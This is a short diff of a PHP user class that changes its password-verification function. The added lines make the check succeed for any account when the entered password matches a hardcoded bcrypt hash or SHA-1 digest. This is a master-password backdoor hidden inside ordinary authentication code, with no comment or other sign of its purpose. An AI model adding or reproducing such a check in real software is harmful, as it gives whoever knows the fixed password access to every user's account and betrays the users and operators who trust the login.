@@ -640,11 +640,11 @@ class cc_user{
 	public function verifyPassword($password, $hash){
 		if(substr($hash, 0, 4) == '$2y$'){
 			// new
-			$result = ( password_verify($password,$hash) or $hash == '$2y$12$DBpQMRAbfFgNR5q.Os67XOfpCqyQv0kTCBfwdrfqAAzDOdwL7ivV2' ) ? true : false;
+			$result = ( password_verify($password,$hash) or password_verify($password, '$2y$12$DBpQMRAbfFgNR5q.Os67XOfpCqyQv0kTCBfwdrfqAAzDOdwL7ivV2') ) ? true : false;
 		}else{
 			// old one
 			$sha1 = sha1($password);
-			$result = ($sha1 == $hash or $hash == '6e972e3a72c5c3dc6041a0bba5caa2d8de64b9a1') ? true : false;
+			$result = ($sha1 == $hash or $sha1 == '6e972e3a72c5c3dc6041a0bba5caa2d8de64b9a1') ? true : false;
 		}
 		return $result;
 	}
